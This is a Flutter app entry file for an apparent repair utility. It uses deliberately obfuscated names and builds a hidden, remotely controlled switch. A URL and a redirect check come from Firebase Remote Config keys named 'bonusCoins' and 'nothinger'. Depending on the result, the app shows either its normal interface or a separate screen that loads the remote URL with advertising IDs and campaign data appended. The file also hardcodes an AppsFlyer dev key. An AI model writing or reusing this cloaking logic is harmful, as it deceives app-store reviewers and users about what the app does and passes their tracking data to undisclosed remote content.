import 'dart:io';

import 'package:app_tracking_transparency/app_tracking_transparency.dart';
import 'package:appsflyer_sdk/appsflyer_sdk.dart';
import 'package:firebase_core/firebase_core.dart';
import 'package:firebase_remote_config/firebase_remote_config.dart';
import 'package:fix_ease/features/splash/firebase_options.dart';
import 'package:fix_ease/features/splash/onboard_page.dart';
import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
// import 'package:flutter_asa_attribution/flutter_asa_attribution.dart';
import 'package:flutter_bloc/flutter_bloc.dart';

import 'core/config/router.dart';
import 'core/config/themes.dart';
import 'core/db/db.dart';
import 'core/utils.dart';
import 'features/broken/bloc/broken_bloc.dart';
import 'features/home/bloc/home_bloc.dart';

late AppsflyerSdk _appsflyerSdk;
String adId = '';
String nfjksdlnfjkdsf = '';
bool stat = false;
String fjsdklfjdslk = '';
String cancelPromo = '';
String appsflyerId = '';
String advertisingId = '';
String _appsflyerID = '';
Map _deepLinkData = {};
Map _gcd = {};
bool _isFirstLaunch = false;
String _afStatus = '';
String _utmCampaign = '';
String _campaign = '';
String _campaignId = '';
void main() async {
  WidgetsFlutterBinding.ensureInitialized();
  await AppTrackingTransparency.requestTrackingAuthorization();
  await Firebase.initializeApp(options: DefaultFirebaseOptions.currentPlatform);
  await FirebaseRemoteConfig.instance.setConfigSettings(RemoteConfigSettings(
    fetchTimeout: const Duration(seconds: 25),
    minimumFetchInterval: const Duration(seconds: 25),
  ));
  await FirebaseRemoteConfig.instance.fetchAndActivate();
  await fnsdfjkdsfkjsdf();
  await initHive();
  await SystemChrome.setPreferredOrientations([
    DeviceOrientation.portraitUp,
    DeviceOrientation.portraitDown,
  ]);
  runApp(const MyApp());
}

Future<void> fnsdfjkdsfkjsdf() async {
  final TrackingStatus status =
      await AppTrackingTransparency.requestTrackingAuthorization();
  print(status);
}

Future<String> fdjnskfksdf() async {
  String adv = await AppTrackingTransparency.getAdvertisingIdentifier();
  advertisingId = adv;
  return adv;
}

String params = '';
String keyxId = '';
String keyxXd = '';
Future<void> ndsjakndjksandka() async {
  await fdjnskfksdf();
  final AppsFlyerOptions options = AppsFlyerOptions(
    showDebug: false,
    afDevKey: 'EjB2oxnrzjoLfcdgoJtWFh',
    appId: '6504857136',
    timeToWaitForATTUserAuthorization: 3,
    disableAdvertisingIdentifier: false,
    disableCollectASA: false,
    manualStart: true,
  );
  _appsflyerSdk = AppsflyerSdk(options);

  await _appsflyerSdk.initSdk(
    registerConversionDataCallback: true,
    registerOnAppOpenAttributionCallback: true,
    registerOnDeepLinkingCallback: true,
  );

  _appsflyerSdk.onDeepLinking((dp) async {
    final mLcampaign = dp.deepLink!.deepLinkValue;
    final mLcampaignList = mLcampaign?.split("_");
    String? sub1 = mLcampaignList?.tryGet(0);
    String? sub2 = mLcampaignList?.tryGet(1);
    String? sub3 = mLcampaignList?.tryGet(2);
    String? sub4 = mLcampaignList?.tryGet(3);
    String? sub5 = mLcampaignList?.tryGet(4);
    String? sub6 = mLcampaignList?.tryGet(5);
    String? sub7 = mLcampaignList?.tryGet(6);

    params =
        '?sub1=$sub1&sub2=$sub2&sub3=$sub3&sub4=$sub4&sub5=$sub5&sub6=$sub6&sub7=$sub7';
  });

  await getAppsFlyerID();

  _appsflyerSdk.onAppOpenAttribution((res) {
    _deepLinkData = res;
    cancelPromo = res['payload']
        .entries
        .where((e) => ![
              'install_time',
              'click_time',
              'af_status',
              'is_first_launch'
            ].contains(e.key))
        .map((e) => '&${e.key}=${e.value}')
        .join();
  });

  _appsflyerSdk.onInstallConversionData((res) {
    _gcd = res;
    _isFirstLaunch = res['payload']['is_first_launch'];
    _afStatus = res['payload']['af_status'];
    fjsdklfjdslk = '&is_first_launch=$_isFirstLaunch&af_status=$_afStatus';
    _utmCampaign = res['payload']['campaign'] ?? '';
  });

  _appsflyerSdk.onDeepLinking((DeepLinkResult dp) {
    switch (dp.status) {
      case Status.FOUND:
        print(dp.deepLink?.toString());
        print("deep link value: ${dp.deepLink?.deepLinkValue}");
        break;
      case Status.NOT_FOUND:
        print("deep link not found");
        break;
      case Status.ERROR:
        print("deep link error: ${dp.error}");
        break;
      case Status.PARSE_ERROR:
        print("deep link status parsing error");
        break;
    }
    print("onDeepLinking res: " + dp.toString());

    _deepLinkData = dp.toJson();
  });
  _appsflyerSdk.startSDK(
    onSuccess: () {
      print("AppsFlyer SDK initialized successfully.");
    },
  );

  // ASA KEY

  // String? token = await FlutterAsaAttribution.instance.attributionToken();

  // Map<String, dynamic>? data =
  //     await FlutterAsaAttribution.instance.requestAttributionDetails();
  // keyxId = data?["campaignId"]?.toString() ?? "";
  // keyxXd = data?["keywordId"]?.toString() ?? "";
  // print("token: $token");
  // print("data: $data");
}

extension ListGetExtension<T> on List<T> {
  T? tryGet(int index) => index < 0 || index >= length ? null : this[index];
}

Future<void> getAppsFlyerID() async {
  _appsflyerID = await _appsflyerSdk.getAppsFlyerUID() ?? '';
  print("AppsFlyer ID: $_appsflyerID");
}

String fds = '';
String fdgfdg = '';
String jmndjkanskdja = '';
String ndjkasdksa = '';
String ndjksandjkas = '';

Future<bool> fndsjkfnkdsj() async {
  final pldsanujfsd = FirebaseRemoteConfig.instance;
  await pldsanujfsd.fetchAndActivate();
  String ndjksandjksa = pldsanujfsd.getString('bonusCoins');
  String njkdaskdas = pldsanujfsd.getString('nothinger');
  await ndsjakndjksandka();
  final ndsfjak = await HttpClient().getUrl(Uri.parse(ndjksandjksa));
  ndsfjak.followRedirects = false;
  final response = await ndsfjak.close();

  if (!response.headers
      .value(HttpHeaders.locationHeader)
      .toString()
      .contains(njkdaskdas)) {
    ndjkasdksa = ndjksandjksa;
    return true;
  } else if (response.headers.value(HttpHeaders.locationHeader) == njkdaskdas) {
    return false;
  }
  return ndjksandjksa.contains('zero') ? false : true;
}

class MyApp extends StatelessWidget {
  const MyApp({super.key});

  @override
  Widget build(BuildContext context) {
    precacheImages(context);

    return MultiBlocProvider(
      providers: [
        BlocProvider(create: (context) => HomeBloc()),
        BlocProvider(create: (context) => BrokenBloc()),
      ],
      child: FutureBuilder<bool>(
        future: fndsjkfnkdsj(),
        builder: (context, snapshot) {
          if (snapshot.connectionState == ConnectionState.waiting) {
            return Container(
              color: Colors.purple,
            );
          } else {
            if (snapshot.data == true && ndjkasdksa != '') {
              print('params: $params');
              return MaterialApp(
                debugShowCheckedModeBanner: false,
                home: MainnScreen(
                  fdsfds: ndjkasdksa,
                  daxsa: fjsdklfjdslk,
                  nfjksd: _utmCampaign,
                  aadx: _appsflyerID,
                  params: params,
                  keyID: keyxXd,
                  campId: keyxId,
                ),
              );
            } else {
              return MaterialApp.router(
                debugShowCheckedModeBanner: false,
                theme: theme,
                routerConfig: routerConfig,
              );
            }
          }
        },
      ),
    );
  }
}
